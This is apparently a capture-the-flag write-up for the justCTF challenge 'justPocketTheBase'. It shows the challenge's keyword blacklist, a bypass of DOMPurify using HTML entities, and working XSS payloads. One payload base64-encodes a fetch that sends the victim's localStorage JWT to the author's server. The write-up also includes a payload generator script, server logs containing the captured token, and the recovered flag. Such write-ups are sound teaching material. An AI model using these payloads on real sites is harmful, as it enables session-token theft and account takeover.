# justPocketTheBase

## Description
```
The thing I love the most about ready-to-use backends and frameworks is that they are always secure :)

-http://justpocketthebase.web.jctf.pro
-https://s3.cdn.justctf.team/c5536ebc-945a-4fa7-af34-f064b29916d0/justpocketthebase_docker.tar.gz
```

## Writeup

Starting off by taking a look at the website before inspecting the provided code. <br/>
After creating an account we are able to create plants which will be stored in the application and can be accessed via `view-plant?id=[ID]`. We can pass a title and an image to create such an object. <br/>
Custom `character-blacklist`: <br/>
```js
let blacklist = [
	'window',
	'document',
	'cookie',
	'fetch',
	'navigator',
	'sendbeacon',
	'+',
	'_',
	'script',
	'!',
	'"',
	'#',
	'%',
	"'",
	'(',
	')',
	'*',
	'+',
	',',
	'-',
	'/',
	':',
	'?',
	'@',
	'[',
	']',
	';'
];

const sanitizedTitle = DOMPurify.sanitize(plant.title);
const newTitleElement = document.createElement('div');
newTitleElement.classList.add('title');
newTitleElement.innerHTML = sanitizedTitle;
const safe = newTitleElement.innerText;
try {
        if (blacklist.some((word) => safe.toLowerCase().includes(word))) {
		throw new Error('not safe!!!');
	}
	title.innerHTML = safe;
} catch (err) {
	window.location.href = '/';
}
```

The `dompurify` can be bypassed using [HTML-Entity-Characters](https://html.com/character-codes/) by simply "encoding" `<` and `>`. <br/>

XSS via title of a new plant by exchanging **()** with **``**: <br/>
```js
&lt;img src=1 onerror=alert`1`&gt;
```

Using [PortSwigger-Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-tag-with-base64-encoding) we are able to simply execute javascript and bypass the `custom-blacklist`. <br/>
```js
&lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`&gt;
```

Making a script to enchance efficiency: <br/>
```py
import base64

payload = 'JAVASCRIPT-PAYLOAD'

print(f'&lt;img src=1 onerror=location=atob`{base64.b64encode(bytes(f"javascript:{payload}", "utf-8"))}`&gt;')
```

Leak localstorage which contains the JWT of the bot: <br/>
```js
&lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`&gt;

// fetch(`https://aryt3.dev/${localStorage.getItem("pocketbase_auth")}`) - my webserver
```

Server Logs after reporting the webpage: <br/>
```
167.71.14.123 - - [15/Jun/2024:13:54:43 +0200] "GET /%7B%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjIwODIsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.LqdYoqEO8cDmOgertTUt5FsmP6jUfDM0Z-GEbEJwBkc%22,%22model%22:%7B%22avatar%22:%22%22,%22collectionId%22:%22_pb_users_auth_%22,%22collectionName%22:%22users%22,%22created%22:%222024-06-15%2010:52:23.378Z%22,%22email%22:%22%22,%22emailVisibility%22:false,%22id%22:%22ebm7wofy99nmb4b%22,%22name%22:%22%22,%22updated%22:%222024-06-15%2010:52:23.378Z%22,%22username%22:%22flag%22,%22verified%22:false%7D%7D HTTP/1.1" 502 559 "http://localhost/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36"
```

URL-Decoded:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjI2OTcsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.hSvcypOCNSsIYeXJ-JZE4H7vWnt7UFvrzAoMBkxwVp0","model":{"avatar":"","collectionId":"_pb_users_auth_","collectionName":"users","created":"2024-06-15 10:52:23.378Z","email":"","emailVisibility":false,"id":"ebm7wofy99nmb4b","name":"","updated":"2024-06-15 10:52:23.378Z","username":"flag","verified":false}}
```

Having obtained the whole localstorage we can switch ours with the one we retrieved. <br/>
After that we can access the post with the `flag-image` and download that image. <br/>
Now we can inspect the image in the `admin-post` which reveals the flag. <br/>
```sh
$ exiftool flag_gygEshYymV.png 
ExifTool Version Number         : 12.76
File Name                       : flag_gygEshYymV.png

---------------------------------------------------------

Artist                          : justCTF{97603333-6596-43fe-aef8-a134c1cc11b4}
```